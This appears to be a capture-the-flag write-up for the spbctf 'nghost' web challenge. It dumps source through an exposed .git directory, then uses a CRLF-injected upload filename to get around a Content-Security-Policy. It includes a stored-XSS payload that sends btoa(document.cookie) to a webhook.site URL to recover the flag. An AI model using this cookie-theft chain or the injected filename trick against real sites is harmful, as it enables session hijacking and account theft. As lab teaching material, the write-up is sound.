@@ -1,0 +1,61 @@
+python git_extract.py http://nghost.spbctf.com/.git/
+	Source code in folder nghost.spbctf.com
+
+# Download the file
+Request
+	GET /download.php?dl_raw&uuid=1ea56c82-55cf-48c7-82d4-27669fea6dd6 HTTP/1.1
+Response
+	HTTP/1.1 200 OK
+	Server: nginx/1.18.0 (Ubuntu)
+	Date: Wed, 02 Dec 2020 15:44:52 GMT
+	Content-Type: text/html;charset=UTF-8
+	Connection: close
+	Content-Disposition: attachment; filename="test.html"
+	Content-Security-Policy: default-src 'self'
+	Content-Length: 119
+
+	file-content
+
+# Cause error with CRLF, and download failed, we can access the file on the webpage.
+
+Content-Disposition: attachment; filename="test.html"
+=> Content-Disposition: attachment; filename="test.html
+
+
+# Upload
+
+## Change
+Content-Disposition: form-data; name="uploaded_file"; filename="test.html"
+Content-Type: text/html
+
+file-content
+
+## To (With "test%0a%0d", command + shift + U)
+Content-Disposition: form-data; name="uploaded_file"; filename="test.html
+"
+Content-Type: text/html
+
+file-content
+
+
+
+Due to Content-Security-Policy: default-src 'self'
+
+Upload first file
+	location.href='https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?cookie='+btoa(document.cookie);
+
+	Get /download.php?uuid=efc93117-d264-4ebc-90b0-dc7132997cb8
+
+	Can access the file with http://nghost.spbctf.com/download.php?dl_raw&uuid=efc93117-d264-4ebc-90b0-dc7132997cb8
+
+Upload second file
+	<script src='/download.php?dl_raw&uuid=efc93117-d264-4ebc-90b0-dc7132997cb8'></script>
+
+	/download.php?uuid=5a21bf61-df53-45d5-8a29-342bae8f5018
+
+Report
+	http://nghost.spbctf.com/download.php?dl_raw&uuid=5a21bf61-df53-45d5-8a29-342bae8f5018
+
+Get
+	RkxBRz1zcGJjdGZ7cGhwX3N0cjFrNHNfYWc0MW59
+	=> FLAG=spbctf{php_str1k4s_ag41n}
